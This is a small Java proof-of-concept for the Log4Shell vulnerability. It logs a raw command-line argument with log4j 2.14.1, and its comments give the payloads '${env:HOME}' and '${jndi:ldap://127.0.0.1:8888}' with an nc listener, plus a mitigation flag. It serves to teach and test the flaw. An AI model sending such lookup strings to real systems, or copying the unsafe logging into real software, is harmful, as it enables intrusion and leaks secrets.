import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Download log4j libs:
 *   wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar
 *   wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar
 *
 * Compile:
 *   javac -cp log4j-api-2.14.1.jar:log4j-core-2.14.1.jar App.java
 *
 * Get environment variables:
 *   java -cp .:log4j-api-2.14.1.jar:log4j-core-2.14.1.jar App '${env:HOME}'
 * 
 * Make TCP connection:
 *   nc -lvnp 8888
 *   java -cp .:log4j-api-2.14.1.jar:log4j-core-2.14.1.jar App '${jndi:ldap://127.0.0.1:8888}'
 *
 * Disable lookup:
 *   LOG4J_FORMAT_MSG_NO_LOOKUPS=true java -cp .:log4j-api-2.14.1.jar:log4j-core-2.14.1.jar App '${env:HOME}'
 */
public class App 
{
    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main( String[] args )
    {
        logger.error(args[0]);
    }
}
